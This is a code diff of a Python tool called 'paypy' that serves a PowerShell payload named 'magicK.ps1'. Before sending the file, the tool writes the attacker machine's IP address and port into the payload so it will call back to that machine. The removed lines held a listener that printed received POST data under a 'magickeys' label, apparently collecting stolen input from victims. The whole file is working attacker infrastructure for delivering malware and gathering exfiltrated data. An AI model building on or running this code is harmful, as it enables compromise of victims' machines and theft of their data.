@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from http.server import SimpleHTTPRequestHandler, HTTPServer, BaseHTTPRequestHandler
+from http.server import SimpleHTTPRequestHandler, HTTPServer
 from socket import socket, AF_INET, SOCK_DGRAM
 from colorama import Fore, Style
 from sys import exit, argv, stdout
@@ -12,23 +12,32 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 		super().end_headers()
 
 	def log_message(self, format, *args):
-		client_ip = self.client_address[0]
-		current_time = strftime('%Y-%m-%d %H:%M:%S')
+		client_ip=self.client_address[0]
+		current_time=strftime('%Y-%m-%d %H:%M:%S')
 		stdout.write(f'{Fore.RED}[paypy]{Style.RESET_ALL} {current_time} - {client_ip} - {format % args}\n')
 		stdout.flush()
 
-	def do_POST(self):
-		content_length = int(self.headers['Content-Length'])
-		post_data = self.rfile.read(content_length)
-		current_time = strftime('%Y-%m-%d %H:%M:%S')
-		stdout.write(f'{Fore.GREEN}[magickeys]{Style.RESET_ALL} {current_time} - Received:\n{post_data.decode()}\n')
-		stdout.flush()
-		self.send_response(200)
-		self.end_headers()
+	def do_GET(self):
+		if self.path.endswith('/magicK.ps1'):
+			with open(self.base_path, 'r') as f:
+				payload_content=f.read()
+			
+			# preparing files
+			payload_content=payload_content.replace('<SERVER_IP>', local_ip)
+			payload_content=payload_content.replace('<SERVER_PORT>', str(port))
+
+			# serving modified content
+			self.send_response(200)
+			self.send_header('Content-type', 'application/octet-stream')
+			self.send_header('Content-Disposition', 'attachment; filename="magicK.ps1"')
+			self.end_headers()
+			self.wfile.write(payload_content.encode())
+		else:
+			super().do_GET()
 
 def get_local_ip():
-	s=socket(AF_INET,SOCK_DGRAM)
-	s.connect(('8.8.8.8',80))
+	s=socket(AF_INET, SOCK_DGRAM)
+	s.connect(('8.8.8.8', 80))
 	local_ip=s.getsockname()[0]
 	s.close()
 	return local_ip
@@ -38,14 +47,14 @@ if len(argv) != 3:
 	print('usage: paypy <port> </payload/path>')
 	exit(1)
 
-# run server
-port = int(argv[1])
-file_path = argv[2]
+# config
+port=int(argv[1])
+file_path=argv[2]
 DownloadHandler.base_path=file_path
 local_ip=get_local_ip()
 
 # start server
-httpd = HTTPServer((local_ip, port), DownloadHandler)
+httpd=HTTPServer((local_ip, port), DownloadHandler)
 print(f'{Fore.RED}[paypy]{Style.RESET_ALL} local server started: {local_ip}:{port}')
 print(f'{Fore.RED}[paypy]{Style.RESET_ALL} downloadable payload: {file_path}')
 stdout.flush()
